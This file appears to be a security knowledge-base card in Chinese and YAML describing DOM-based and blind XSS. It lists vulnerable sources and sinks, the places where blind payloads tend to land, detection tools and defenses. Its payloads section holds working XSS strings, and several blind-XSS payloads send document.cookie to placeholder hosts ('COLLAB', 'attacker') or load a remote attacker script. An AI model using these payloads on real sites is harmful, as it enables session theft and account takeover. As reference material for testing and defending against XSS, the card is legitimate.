@@ -1,0 +1,88 @@
+# 技术卡片: XSS - DOM型与盲XSS
+# 分类: xss / dom-blind
+# 版本: 1.0
+# 日期: 2026-07-21
+# 来源: SecAtlas KB-XSS-03/04
+
+id: "xss-dom-blind"
+name: "XSS DOM型与盲XSS攻击"
+category: "xss"
+subcategory: "dom-blind"
+severity: "high"
+
+description: |
+  DOM型：前端 JS 使用危险 sink（innerHTML/document.write/eval）
+  处理用户可控 source（location.hash/document.URL/postMessage）。
+  盲XSS：payload 在攻击者不可见的管理面板/日志中触发，
+  通过 OOB 外带确认。
+
+trigger_signals:
+  dom:
+    - "URL hash 值被 JS 读取并写入 DOM"
+    - "页面 JS 使用 innerHTML/document.write/eval"
+    - "location.hash/location.search 未过滤直接使用"
+  blind:
+    - "输入提交到后台/工单/日志系统"
+    - "无法直接观察执行结果"
+    - "需要 OOB 回连确认"
+
+payloads:
+  dom_sources:
+    - location_hash: '#<img src=x onerror=alert(1)>'
+      sink: "document.getElementById('x').innerHTML = location.hash.slice(1)"
+    - postMessage: "postMessage('<img src=x onerror=alert(1)>', '*')"
+      sink: "window.addEventListener('message', e => div.innerHTML = e.data)"
+    - document_url: "https://target.com/?x=<svg onload=alert(1)>"
+      sink: "new URLSearchParams(location.search).get('x') → innerHTML"
+
+  dom_sinks:
+    - innerHTML: "element.innerHTML = userInput"
+    - document_write: "document.write(userInput)"
+    - eval: "eval(userInput)"
+    - setTimeout_string: "setTimeout('userInput', 1000)"
+    - location_change: "location.href = 'javascript:alert(1)'"
+    - jquery_html: "$('#div').html(userInput)"
+
+  blind_xss:
+    - basic: >
+        "><img src=x onerror="new Image().src='https://COLLAB/?c='+document.cookie">
+    - script_remote: >
+        "><script src="https://attacker/xss.js"></script>
+    - input_autofocus: >
+        "><input onfocus="fetch('https://COLLAB/?c='+document.cookie)" autofocus>
+    - svg_style: >
+        <svg><style><img src=x onerror="fetch('https://COLLAB/?s='+document.cookie)">
+
+  blind_targets:
+    - "反馈表单/支持工单"
+    - "用户注册资料字段"
+    - "订单备注/留言"
+    - "PDF 生成器 HTML 注入"
+    - "邮件模板注入"
+    - "日志注入（User-Agent/Referer）"
+
+success_indicators:
+  dom: "弹窗 alert(document.domain)"
+  blind: "XSS Hunter/Burp Collaborator 收到含 cookie 的请求"
+
+prerequisites:
+  dom: "JS 使用危险 sink + 用户可控 source"
+  blind: "输入被存储并在后台不可见页面渲染"
+
+detection_tools:
+  - "XSS Hunter (xsshunter.com)"
+  - "Burp Collaborator"
+  - "bXSS (blind XSS framework)"
+  - "Interactsh"
+
+defense:
+  - "Source 侧：URLSearchParams 等安全 API"
+  - "Sink 侧：textContent 替代 innerHTML"
+  - "Trusted Types CSP"
+  - "DOMPurify 净化"
+  - "避免 eval/Function/setTimeout(string)"
+
+sources:
+  - kb: "KB-XSS-03 / KB-XSS-04"
+  - ref: "PortSwigger: DOM-based XSS / Blind XSS"
+  - ref: "CWE-79"
